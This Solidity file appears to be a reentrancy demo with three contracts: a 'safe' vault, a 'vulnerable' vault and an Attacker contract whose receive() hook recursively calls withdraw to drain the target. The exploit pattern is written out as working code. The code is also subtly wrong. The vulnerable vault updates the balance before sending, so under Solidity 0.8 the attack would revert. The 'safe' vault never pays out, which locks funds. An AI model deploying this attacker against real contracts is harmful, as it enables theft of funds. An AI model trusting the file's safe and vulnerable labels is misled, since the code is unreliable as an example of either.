// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// import {SafeVault} from "safeVault.sol";
contract SafeVault is ReentrancyGuard {
    
mapping(address=>uint256) private _balances;

    function deposit() public payable {
        _balances[msg.sender] +=msg.value;
    }

    function withdraw(uint256 amount) public nonReentrant {
        _balances[msg.sender] -= amount;
    }
}

contract VulnerableVault {
   
mapping(address=>uint256) private _balances;

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        _balances[msg.sender] -= _amount;
        (bool sent, )=msg.sender.call{value: _amount}("");
        require(sent,"transfer failed");
        //if above line not included then withdrawl will not actually happens it will just change 
        //balnaces in storage.. with this line it will actually send ETH.
    }
}

contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // Fallback function triggered during reentrancy
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether); // Recursive call
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: 1 ether}(); // Deposit ETH
        target.withdraw(1 ether); // Start reentrancy
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

